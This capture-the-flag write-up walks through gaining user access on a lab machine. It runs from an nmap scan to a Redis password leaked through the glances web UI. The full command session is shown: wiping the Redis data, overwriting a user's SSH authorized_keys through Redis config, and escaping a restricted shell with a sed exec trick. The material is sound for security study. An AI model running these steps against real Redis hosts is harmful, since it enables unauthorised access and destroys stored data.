# Writable (user)


Running nmap with `-sV -p1-65535` on the machine returns the following:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2018-10-26 01:03 BST
Nmap scan report for 10.10.2.6
Host is up (0.030s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
6379/tcp open  redis   Redis key-value store
8000/tcp open  http    WSGIServer 0.1 (Python 2.7.15rc1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.25 seconds
```

Examining the service on port 8000 shows the program `glances`[1] running. This
shows a list of processes, but not in enough detail. Looking at the docs we can
see it has a way of showing all the options, which is the `/` command.

From this, we can see that the redis is being ran with:
```
su tom -c redis-server --bind 0.0.0.0 --requirepass redis_is_really_secure
```

So we can now access redis. 

```
10.10.2.6:6379> auth redis_is_really_secure
OK
10.10.2.6:6379> keys *
(empty list or set)
```

So we can see there is no keys, so we have to think of another way to exploit.

There is an article [2] by the author of Redis, showing you how to overwrite the
file authorized_keys to allow login via ssh.

A session exploiting this:

```
$ ssh-keygen
Generating public/private rsa key pair.                                       
Enter file in which to save the key (/home/a/.ssh/id_rsa): /tmp/example/id_rsa
Enter passphrase (empty for no passphrase):                                   
Enter same passphrase again:                                                  
Your identification has been saved in /tmp/example/id_rsa.                    
Your public key has been saved in /tmp/example/id_rsa.pub.                    
The key fingerprint is:                                                       
SHA256:QmcDfrvzlD5pXD3S9/a/imlPBF6ipk5bowP0SdrPodk a@b                   
The key's randomart image is:                                                 
+---[RSA 2048]----+                                                           
|      .          |                                                           
|     . .         |                                                           
|      o =  o .   |
|     o = oo +    |
|    . * So . +   |
|     o =oo .+ + .|
|      .oO++o o o.|
|      o++E*.+   o|
|       +..++.o.o*|
+----[SHA256]-----+
$ cat /tmp/example/id_rsa.pub | xsel --clipboard
$ redis-cli -h 10.10.2.6
10.10.2.6:6379> auth redis_is_really_secure
OK
10.10.2.6:6379> flushall
OK
10.10.2.6:6379> config set dir "/home/tom/.ssh/"
OK
10.10.2.6:6379> config set dbfilename "authorized_keys"
OK
10.10.2.6:6379> set x "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCafYcuD2EjCyIuAvH91VAcqvxpWiEhYXO0/OXXKNBoFTF1texYXWaQPAReMOm8SsPDEy9rbN27QCMbKHDqQWndf2plQVEAWd3T/2XvMiSqzFN9xyGInoNdee2aHJXtll2IR2EfmmMOfuRt1Bl7YWgLdMht6FjmvccNytPl3pKEd/A+vBW1E7+RY4Y+hVfjQ8QMet0HLoCwunBa7x/EZf7SioYLrrA8jnqUBJDJnGJqrBZ9NzLiGzcbMVS8oUS5NP3iyZ9BP3GBATKzQOF1CLocYXsy+JCBd/igy2TFuWYfh//cRzDglqrYqDbLraBdTUhEAsvZVe+Gtd+6ZP9vfjvh a@b\n\n"
10.10.2.6:6379> save
10.10.2.6:6379>
simeiz :: /tmp/example » ssh tom@10.10.2.6 -i /tmp/example/id_rsa
Last login: Tue Oct 23 17:36:54 2018 from 10.10.254.1
tom@9f10564a2db5:~$ #w00tw00t
```

Now that we can login, we see that we are given a restricted shell.

When we look into what binaries we can run, we can see that we can use `ls` and
`sed`.

GTFOBins lists a way of abusing sed, but this needs to be modified to use the
full path of our shell as it isn't in our `PATH`.

```
tom@9f10564a2db5:~$ sed -n '1e exec /bin/sh 1>&0' /etc/hosts
$ /bin/cat user.txt
CTF{wait_ssh_can_still_read_that}
```

So we've got our flag.

## References

* [1] https://glances.readthedocs.io/en/latest/
* [2] http://antirez.com/news/96
* [3] https://gtfobins.github.io/gtfobins/sed/
